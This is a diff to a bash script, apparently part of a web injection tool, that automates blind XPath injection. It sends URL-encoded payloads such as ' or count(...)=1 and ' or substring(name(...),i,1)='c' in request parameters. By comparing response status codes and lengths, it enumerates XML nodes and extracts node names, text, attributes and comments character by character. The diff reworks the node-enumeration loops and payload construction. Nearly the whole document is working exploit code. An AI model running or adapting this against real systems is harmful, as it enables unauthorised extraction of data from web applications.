@@ -1223,6 +1223,7 @@ echo ""
 echo "Total element depth: $fcount"
 #cat ./listofxpathnodes.txt
 
+###loop to grab the list of accessible nodes
 attcount=1
 xcount=1
 ecount=1
@@ -1235,14 +1236,19 @@ xcount=1
 ycount=1
 zcount=2
 rm ./listofxpathelements.txt 2>/dev/null
+rm ./shortlist.txt 2>/dev/null
+rm ./extrashortlist.txt 2>/dev/null
+echo "Please wait - enumerating nodes..."
+
 while [[ "$ycount" -le "$zcount" ]] ; do
-	if [[ "$ycount" == "$zcount" ]] ; then
-		obuff="%2f%2a%5b1%5d%2f%2a%5b2%5d"
-	fi
+#	if [[ "$ycount" == "$zcount" ]] ; then
+#		obuff="%2f%2a%5b1%5d%2f%2a%5b2%5d"
+#	fi
 	while [[ $ecount -le $fcount ]] ; do
 		success=0
 		xcount=1
 		while [[ $xcount -le $maxxcount ]] ; do
+			echo -n "."
 			vbuff="%2f%2a%5b$xcount%5d"		
 			xbuff="$obuff""$vbuff"
 	
@@ -1256,20 +1262,28 @@ while [[ "$ycount" -le "$zcount" ]] ; do
 			length_true=`echo $response | cut -d ":" -f 2`								
 				((lendiff=$length_true-$length_false))
 			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-				echo -n "$ybuff " >> ./listofxpathelements.txt
+				#echo -n "$ybuff " >> ./listofxpathelements.txt
+				echo "$ybuff" >> ./shortlist.txt
 				mynodecount=$xcount
-				echo -n "$ybuff "
+				#echo "$ybuff "
 				success=1 
+				if [[ "$xcount" != "1" ]] ; then
+					echo "$ybuff" >> ./extrashortlist.txt				
+				fi
 			fi
 			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 				if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
-					echo -n "$ybuff " >> ./listofxpathelements.txt				
+					#echo -n "$ybuff " >> ./listofxpathelements.txt
+					echo "$ybuff" >> ./shortlist.txt				
 					mynodecount=$xcount
-					echo -n "$ybuff "
+					#echo "$ybuff "
 					success=1
+					if [[ "$xcount" != "1" ]] ; then
+						echo "$ybuff" >> ./extrashortlist.txt				
+					fi
 				fi
 			fi
-			nodetests
+			#nodetests
 			((xcount=$xcount+1))
 		done
 		((ecount=$ecount+1))
@@ -1278,50 +1292,298 @@ while [[ "$ycount" -le "$zcount" ]] ; do
 	done
 ((ycount=$ycount+1))
 done
+
+###second loop to grab the list of accessible nodes
+
+#rm ./extrashortlist2.txt 2>/dev/null
+attcount=1
+xcount=1
+ecount=1
+fcount=4
+maxxcount=15
+obuff=""
+mbuff=""
+iteration=0
+xcount=1
+#((fcount=$fcount+1))
+ycount=1
+zcount=2
+#echo "extrashortlist"
+#cat ./extrashortlist.txt 2>/dev/null
+#echo "done"
+
+
+cat ./extrashortlist.txt 2>/dev/null | while read entry ; do
+	###hex-encode the entries in the shortlist
+	i=0
+	input=$entry
+	outbuf=''
+	stringlength=${#input}
+	((stringlengthminus1=$stringlength-1))
+	while ((i<$stringlength)) ; do 
+		char=`echo "${input:i:1}"`
+		outbuf=$outbuf`echo -n "%"`
+		outbuf=$outbuf`printf "%02x" "'$char'"`
+		((i++))
+	done 
+	obuff=$outbuf
+		xcount=1
+		while [[ $xcount -le $maxxcount ]] ; do
+			echo -n "."
+			vbuff="%2f%2a%5b$xcount%5d"		
+			xbuff="$obuff""$vbuff"
+	
+			rbuff="/*[$xcount]"
+			ybuff="$entry""$rbuff"
+			success=0
+			#echo "ecount: $ecount xcount: $xcount"
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
+			requester
+			status_true=`echo $response | cut -d ":" -f 1`
+			length_true=`echo $response | cut -d ":" -f 2`								
+				((lendiff=$length_true-$length_false))
+			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+				#echo -n "$ybuff " >> ./listofxpathelements.txt
+				echo "$ybuff" >> ./shortlist.txt
+				mynodecount=$xcount
+				#echo "FOUND: $ybuff "
+				success=1 
+				#if [[ "$xcount" != "1" ]] ; then
+				echo "$ybuff" >> ./extrashortlist2.txt				
+				#fi
+			fi
+			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+					#echo -n "$ybuff " >> ./listofxpathelements.txt
+					echo "$ybuff" >> ./shortlist.txt				
+					mynodecount=$xcount
+					#echo "FOUND: $ybuff "
+					success=1
+					#if [[ "$xcount" != "1" ]] ; then
+					echo "$ybuff" >> ./extrashortlist2.txt				
+					#fi
+				fi
+			fi
+			#nodetests
+			((xcount=$xcount+1))
+		done
+		((ecount=$ecount+1))
+		obuff="%2f%2a%5b%31%5d"$obuff
+		mbuff="/*[1]"$mbuff
+done
+
+###third loop to grab the list of accessible nodes
+
+#rm ./extrashortlist2.txt 2>/dev/null
+attcount=1
+xcount=1
+ecount=1
+fcount=4
+maxxcount=15
+obuff=""
+mbuff=""
+iteration=0
+xcount=1
+#((fcount=$fcount+1))
+ycount=1
+zcount=2
+#echo "extrashortlist2"
+#cat ./extrashortlist2.txt 2>/dev/null
+#echo "done"
+
+
+cat ./extrashortlist2.txt 2>/dev/null | while read entry ; do
+	###hex-encode the entries in the shortlist
+	i=0
+	input=$entry
+	outbuf=''
+	stringlength=${#input}
+	((stringlengthminus1=$stringlength-1))
+	while ((i<$stringlength)) ; do 
+		char=`echo "${input:i:1}"`
+		outbuf=$outbuf`echo -n "%"`
+		outbuf=$outbuf`printf "%02x" "'$char'"`
+		((i++))
+	done 
+	obuff=$outbuf
+		xcount=1
+		while [[ $xcount -le $maxxcount ]] ; do
+			echo -n "."
+			vbuff="%2f%2a%5b$xcount%5d"		
+			xbuff="$obuff""$vbuff"
+	
+			rbuff="/*[$xcount]"
+			ybuff="$entry""$rbuff"
+			success=0
+			#echo "ecount: $ecount xcount: $xcount"
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
+			requester
+			status_true=`echo $response | cut -d ":" -f 1`
+			length_true=`echo $response | cut -d ":" -f 2`								
+				((lendiff=$length_true-$length_false))
+			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+				#echo -n "$ybuff " >> ./listofxpathelements.txt
+				echo "$ybuff" >> ./shortlist.txt
+				mynodecount=$xcount
+				#echo "FOUND: $ybuff "
+				success=1 
+				#if [[ "$xcount" != "1" ]] ; then
+				#	echo "$ybuff" >> ./extrashortlist2.txt				
+				#fi
+			fi
+			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+				if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+					#echo -n "$ybuff " >> ./listofxpathelements.txt
+					echo "$ybuff" >> ./shortlist.txt				
+					mynodecount=$xcount
+					#echo "FOUND: $ybuff "
+					success=1
+					#if [[ "$xcount" != "1" ]] ; then
+					#	echo "$ybuff" >> ./extrashortlist2.txt				
+					#fi
+				fi
+			fi
+			#nodetests
+			((xcount=$xcount+1))
+		done
+		((ecount=$ecount+1))
+		obuff="%2f%2a%5b%31%5d"$obuff
+		mbuff="/*[1]"$mbuff
+done
+
+cat ./shortlist.txt | sort | uniq > ./finalshortlist.txt				
+
+echo ""
+echo "Nodes enumerated:"
+
+cat ./finalshortlist.txt
+
+echo "Extracting data from enumerated nodes..."
+echo ""
+			
+###
+
+attcount=1
+xcount=1
+ecount=1
+maxxcount=15
+obuff=""
+mbuff=""
+iteration=0
+xcount=1
+ycount=1
+zcount=2
+
+cat ./finalshortlist.txt | while read entry ; do
+	###hex-encode the entries in the shortlist
+	i=0
+	input=$entry
+	outbuf=''
+	stringlength=${#input}
+	((stringlengthminus1=$stringlength-1))
+	while ((i<$stringlength)) ; do 
+		char=`echo "${input:i:1}"`
+		outbuf=$outbuf`echo -n "%"`
+		outbuf=$outbuf`printf "%02x" "'$char'"`
+		((i++))
+	done 
+	#init some params
+	obuff=$outbuf
+	success=1
+	stringextract=0
+	stringlength=1
+	echo -n "$entry "
+	echo -n "$entry " >> ./listofxpathelements.txt
+	nodetests
+done
+
+#while [[ "$ycount" -le "$zcount" ]] ; do
+	#if [[ "$ycount" == "$zcount" ]] ; then
+	#	obuff="%2f%2a%5b1%5d%2f%2a%5b2%5d"
+	#fi
+	#while [[ $ecount -le $fcount ]] ; do
+		#success=0
+		#xcount=1
+#		while [[ $xcount -le $maxxcount ]] ; do
+#			vbuff="%2f%2a%5b$xcount%5d"		
+#			xbuff="$obuff""$vbuff"
+#	
+#			rbuff="/*[$xcount]"
+#			ybuff="$mbuff""$rbuff"
+#			success=0
+#			#echo "ecount: $ecount xcount: $xcount"
+#			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$xbuff%29%3d1$end"`
+#			requester
+#			status_true=`echo $response | cut -d ":" -f 1`
+#			length_true=`echo $response | cut -d ":" -f 2`								
+#				((lendiff=$length_true-$length_false))
+#			if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+#				echo -n "$ybuff " >> ./listofxpathelements.txt
+#				mynodecount=$xcount
+#				echo -n "$ybuff "
+#				success=1 
+#			fi
+#			if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+#				if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+#					echo -n "$ybuff " >> ./listofxpathelements.txt
+#					mynodecount=$xcount
+#					echo -n "$ybuff "
+#					success=1
+#				fi
+#			fi
+#			nodetests
+#			((xcount=$xcount+1))
+#		done
+#		#((ecount=$ecount+1))
+#		#obuff="%2f%2a%5b%31%5d"$obuff
+#		#mbuff="/*[1]"$mbuff
+#	#done
+#((ycount=$ycount+1))
+#done
 }
 
 nodetests()
 {
 #test for the node
 if [[ "$success" == "1" ]] ; then
-	gcount=1
-	maxnodes=10
-	while [[ $gcount -le $maxnodes ]] ; do
-		#first we count the number of nodes at the current index
-		#' or count($obuff/*[$xcount]/*)=$gcount or 'a'='b
-		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%2a%5b$xcount%5d%2f%2a%29%3d$gcount$end"`
-		requester
-		status_true=`echo $response | cut -d ":" -f 1`
-		length_true=`echo $response | cut -d ":" -f 2`
-		((lendiff=$length_true-$length_false))
-		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
-			echo -n "Child nodes: $gcount "
-			echo -n "Child nodes: $gcount " >> ./listofxpathelements.txt
-			stringlength=1
-			numberofattributes=$gcount
-		fi
-		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
-			if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
-				echo -n "Child nodes: $gcount "
-				echo -n "Child nodes: $gcount " >> ./listofxpathelements.txt
-				numberofattributes=$gcount
-				stringlength=1
-			fi
-		fi
-		attcount=1
-		if [[ "$ecount" == "$fcount" ]] ; then
-			if [[ "$gcount" == "1" ]] ; then
-				stringlength=1
-			fi
-		fi
+#	gcount=1
+#	maxnodes=10
+#	while [[ $gcount -le $maxnodes ]] ; do
+#		#first we count the number of nodes at the current index
+#		#' or count($obuff/*[$xcount]/*)=$gcount or 'a'='b
+#		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2a%29%3d$gcount$end"`
+#		requester
+#		status_true=`echo $response | cut -d ":" -f 1`
+#		length_true=`echo $response | cut -d ":" -f 2`
+#		((lendiff=$length_true-$length_false))
+#		if [[ "$status_true" != "$status_false" && "$status_true" == "200" ]] ; then
+#			echo -n "Child nodes: $gcount "
+#			echo -n "Child nodes: $gcount " >> ./listofxpathelements.txt
+#			stringlength=1
+#			numberofattributes=$gcount
+#		fi
+#		if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
+#			if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
+#				echo -n "Child nodes: $gcount "
+#				echo -n "Child nodes: $gcount " >> ./listofxpathelements.txt
+#				numberofattributes=$gcount
+#				stringlength=1
+#			fi
+#		fi
+#		attcount=1
+#		if [[ "$ecount" == "$fcount" ]] ; then
+#			if [[ "$gcount" == "1" ]] ; then
+#				stringlength=1
+#			fi
+#		fi
 		#stringlength=1
 		# now we get the length of the name of the node
 		if [[ "$stringlength" == "1" ]] ; then
 			hcount=1
 			length=0
 			while [[ $hcount -le $maxxcount ]] ; do
-				#' or string-length(name($obuff/*[$xcount]))=$hcount or 'a'='b
-				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%2f%2a%5b$xcount%5d%29%29%3d$hcount$end"`
+				#$begin or string-length(name($obuff))=$hcount$end
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%29%29%3d$hcount$end"`
 				#echo "bp: $badparams"			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
@@ -1333,6 +1595,7 @@ if [[ "$success" == "1" ]] ; then
 					if [[ length != "0" ]] ; then
 						stringextract=1
 					fi
+					#echo "length: $length"
 				fi
 				if [[ "$status_true" == "$status_false" && "$status_true" == "200" ]] ; then
 					if [[ $lendiff -gt 6 || $lendiff -lt -6 ]] ; then			
@@ -1341,6 +1604,7 @@ if [[ "$success" == "1" ]] ; then
 						if [[ length != "0" ]] ; then
 							stringextract=1
 						fi
+						#echo "length: $length"
 					fi
 				fi
 		 		((hcount=$hcount+1))
@@ -1351,8 +1615,8 @@ if [[ "$success" == "1" ]] ; then
 			icount=1
 			while [[ $icount -le $length ]] ; do
 				for char in `cat ./payloads/alphabet.txt` ; do
-					#' or substring(name($obuff/*[$xcount]),$icount,1)='$char' or 'a'='b	
-					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%2a%5b$xcount%5d%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
+					#$begin or substring(name($obuff),$icount,1)='$char'$end	
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1389,8 +1653,8 @@ if [[ "$success" == "1" ]] ; then
 		if [[ "$stringlength" == "1" ]] ; then
 			hcount=1
 			while [[ $hcount -le $maxxcount ]] ; do
-				#' or string-length($obuff/*[$xcount]/test())=$hcount or 'a'='b
-				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%2a%5b$xcount%5d%2f%74%65%78%74%28%29%29%3d$hcount$end"`			
+				#$begin or string-length($obuff/text())=$hcount$end
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%74%65%78%74%28%29%29%3d$hcount$end"`			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
 				length_true=`echo $response | cut -d ":" -f 2`
@@ -1415,9 +1679,8 @@ if [[ "$success" == "1" ]] ; then
 			icount=1
 			while [[ $icount -le $length ]] ; do
 				for char in `cat ./payloads/alphabet.txt` ; do
-					#' or substring(/*[1]/*[1]/*[1]/*[2]/text(),1,1)='1'+or+'a'='b&submit=Inject!
-					#' or substring($obuff/*[$xcount]/text(),$icount,1)='$char' or 'a'='b
-					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%2a%5b$xcount%5d%2f%74%65%78%74%28%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
+					#$begin or substring($obuff/text(),$icount,1)='$char'$end
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%74%65%78%74%28%29%2c$icount%2c%31%29%3d%27$char%27$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1452,7 +1715,7 @@ if [[ "$success" == "1" ]] ; then
 	((gcount=$gcount+1))
 	stringlength=0
 	stringextract=0
-	done
+	#done
 fi
 }
 
@@ -1464,12 +1727,8 @@ attstringextract=0
 #test for attribute node with /@*
 attgcount=1
 while [[ $attgcount -le $maxxcount ]] ; do
-	attvbuff="%2f%2a%5b$xcount%5d%2f%40%2a"
-	attxbuff="$obuff$attvbuff%29%3d$attgcount"				
-	attrbuff="/*[$xcount]/@*"
-	attybuff="$mbuff$attrbuff)=$attgcount"
-		
-	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$attxbuff$end"`
+							    #$begin or count($obuff/@*)=$attgcount$end
+	badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%40%2a%29%3d$attgcount$end"`
 	requester
 	status_true=`echo $response | cut -d ":" -f 1`
 	length_true=`echo $response | cut -d ":" -f 2`
@@ -1491,12 +1750,8 @@ while [[ $attgcount -le $maxxcount ]] ; do
 		if [[ "$attstringlength" == "1" ]] ; then
 			atthcount=1
 			while [[ $atthcount -le $maxxcount ]] ; do
-				attvbuff="%2f%2a%5b$xcount%5d%2f%40%2a%5b$battcount%5d"
-				attxbuff="%6e%61%6d%65%28$obuff$attvbuff%29%29%3d$atthcount"
-			
-				attrbuff="/*[$xcount]/@*[$battcount]"
-				attybuff="name($mbuff$attrbuff)=$atthcount"			
-				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$attxbuff$end"`			
+										    #$begin or string-length(name($obuff/@*[$battcount]))=$atthcount$end
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%29%3d$atthcount$end"`			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
 				length_true=`echo $response | cut -d ":" -f 2`
@@ -1524,11 +1779,8 @@ while [[ $attgcount -le $maxxcount ]] ; do
 			atticount=1
 			while [[ $atticount -le $length ]] ; do
 				for char in `cat ./payloads/alphabet.txt` ; do
-					attvbuff="%2f%2a%5b$xcount%5d%2f%40%2a%5b$battcount%5d%29%2c$atticount%2c%31%29%3d%27$char%27"
-					attxbuff="$obuff$attvbuff"
-					attrbuff="/*[$xcount]/@*[$battcount]),$atticount,1)='$char'"
-					attybuff="$mbuff$attrbuff"
-					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$attxbuff$end"`			
+					#$begin or substring(name($obuff/@*[$battcount]),$atticount,1)='$char'$end
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28%6e%61%6d%65%28$obuff%2f%40%2a%5b$battcount%5d%29%2c$atticount%2c%31%29%3d%27$char%27$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1553,12 +1805,8 @@ while [[ $attgcount -le $maxxcount ]] ; do
 		if [[ "$attstringlength" == "1" ]] ; then
 			ahcount=1
 			while [[ $ahcount -le $maxxcount ]] ; do
-				attvbuff="%2f%2a%5b$xcount%5d%2f%40%2a%5b$battcount%5d"
-				attxbuff="$obuff$attvbuff%29%3d$ahcount"
-		
-				attrbuff="/*[$xcount]/@*[$battcount]"
-				attybuff="$mbuff$attrbuff=$ahcount"			
-				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$attxbuff$end"`			
+				#$begin or string-length($obuff/@*[$battcount])=$ahcount$end			
+				badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%40%2a%5b$battcount%5d%29%3d$ahcount$end"`			
 				requester
 				status_true=`echo $response | cut -d ":" -f 1`
 				length_true=`echo $response | cut -d ":" -f 2`
@@ -1587,11 +1835,8 @@ while [[ $attgcount -le $maxxcount ]] ; do
 			bicount=1
 			while [[ $bicount -le $length ]] ; do
 				for char in `cat ./payloads/alphabet.txt` ; do
-					attvbuff="%2f%2a%5b$xcount%5d%2f%40%2a%5b$battcount%5d%2c$bicount%2c%31%29%3d%27$char%27"
-					attxbuff="$obuff$attvbuff"
-					attrbuff="/*[$xcount]/@*[$battcount],$bicount,1)='$char'"
-					attybuff="$mbuff$attrbuff"
-					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$attxbuff$end"`			
+					#$begin or substring($obuff/@*[$battcount],$bicount,1)='$char'$end
+					badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%40%2a%5b$battcount%5d%2c$bicount%2c%31%29%3d%27$char%27$end"`			
 					requester
 					status_true=`echo $response | cut -d ":" -f 1`
 					length_true=`echo $response | cut -d ":" -f 2`
@@ -1633,16 +1878,12 @@ done
 commentnodetests()
 {
 #test for comment node with /comment()
-#stringextract=0
-#stringlength=0		
+stringextract=0
+stringlength=0		
 egcount=1
-maxcom=20
-comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29"
-comxbuff="$obuff$comvbuff%29%3d$egcount"				
-comrbuff="/*[$xcount]/comment()"
-comybuff="$mbuff$comrbuff)=$egcount"
-
-badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$comxbuff$end"`
+maxcom=50
+						    #$begin or count($obuff/comment())=$egcount$end
+badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%63%6f%75%6e%74%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$egcount$end"`
 requester
 status_true=`echo $response | cut -d ":" -f 1`
 length_true=`echo $response | cut -d ":" -f 2`
@@ -1658,14 +1899,9 @@ fi
 #now we get the length of the content of the comment:
 if [[ "$stringlength" == "1" ]] ; then
 	comhcount=1
-	while [[ $comhcount -le $maxcom ]] ; do
-		#comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29"
-		#comxbuff="$obuff$comvbuff%29%3d$comhcount"
-		#comxbuff="$obuff%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$comhcount"
-
-		comrbuff="/*[$xcount]/comment()"
-		comybuff="$mbuff$comrbuff)=$comhcount"			
-		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$comhcount$end"`		
+	while [[ $comhcount -le $maxcom ]] ; do	
+		#$begin or string-length($obuff/comment())=$comhcount$end		
+		badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%74%72%69%6e%67%2d%6c%65%6e%67%74%68%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%29%3d$comhcount$end"`		
 		#echo $badparams				
 		requester
 		status_true=`echo $response | cut -d ":" -f 1`
@@ -1692,11 +1928,8 @@ if [[ "$stringextract" == "1" ]] ; then
 	comicount=1
 	while [[ "$comicount" -le "$comlen" ]] ; do
 		for char in `cat ./payloads/alphabet.txt` ; do
-			comvbuff="%2f%2a%5b$xcount%5d%2f%63%6f%6d%6d%65%6e%74%28%29%2c$comicount%2c%31%29%3d%27$char%27"
-			comxbuff="$obuff$comvbuff"
-			comrbuff="/*[$xcount]/comment(),$comicount,1)='$char'"
-			comybuff="$mbuff$comrbuff"
-			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$comxbuff$end"`			
+			#$begin or substring($obuff/comment(),$comicount,1)='$char'$end
+			badparams=`echo "$cleanoutput" | replace "$payload" "$begin%20%6f%72%20%73%75%62%73%74%72%69%6e%67%28$obuff%2f%63%6f%6d%6d%65%6e%74%28%29%2c$comicount%2c%31%29%3d%27$char%27$end"`			
 			#echo $badparams
 			requester
 			status_true=`echo $response | cut -d ":" -f 1`
@@ -1726,8 +1959,6 @@ if [[ "$stringextract" == "1" ]] ; then
 		done
 	((comicount=$comicount+1))
 	done
-	#echo -n ' '
-	#echo -n ' ' >> ./listofxpathelements.txt
 fi			
 #thats it for comment nodes		
 }
